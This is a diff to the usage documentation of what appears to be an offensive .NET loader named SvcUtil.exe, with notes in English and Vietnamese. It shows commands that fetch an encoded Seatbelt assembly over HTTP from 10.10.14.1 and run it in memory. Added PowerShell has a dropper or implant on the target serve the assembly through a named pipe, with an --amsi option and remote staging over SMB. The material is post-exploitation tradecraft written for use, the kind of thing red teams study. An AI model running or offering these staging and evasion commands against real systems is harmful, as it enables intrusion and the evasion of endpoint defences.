@@ -409,9 +409,25 @@ SvcUtil.exe --exec-asm -s seatbelt.enc -p MyP@ssw0rd
 # Stage from HTTP
 SvcUtil.exe --exec-asm --stage-http http://10.10.14.1/seatbelt.b64
 
-# Stage from named pipe
+# Stage from named pipe (see below)
 SvcUtil.exe --exec-asm --stage-pipe mypipe
 ```
+
+**Named pipe staging** — SvcUtil kết nối như pipe client. Cần có process khác tạo pipe server trước:
+
+```powershell
+# Trên target — process đã có sẵn (dropper, implant, PowerShell) tạo pipe server:
+$pipe = New-Object IO.Pipes.NamedPipeServerStream("mypipe", [IO.Pipes.PipeDirection]::Out)
+$pipe.WaitForConnection()
+$bytes = [IO.File]::ReadAllBytes("C:\staging\Seatbelt.exe")
+$pipe.Write($bytes, 0, $bytes.Length)
+$pipe.Close()
+
+# SvcUtil đọc từ pipe và chạy assembly
+# SvcUtil.exe --stage-pipe mypipe --exec-asm --amsi -- -group=all
+```
+
+Pipe cũng hỗ trợ remote qua SMB: `--stage-pipe fileserver/mypipe` kết nối đến `\\fileserver\pipe\mypipe`.
 
 **Passing arguments to the assembly** — use `--` to separate SvcUtil flags from assembly arguments:
 
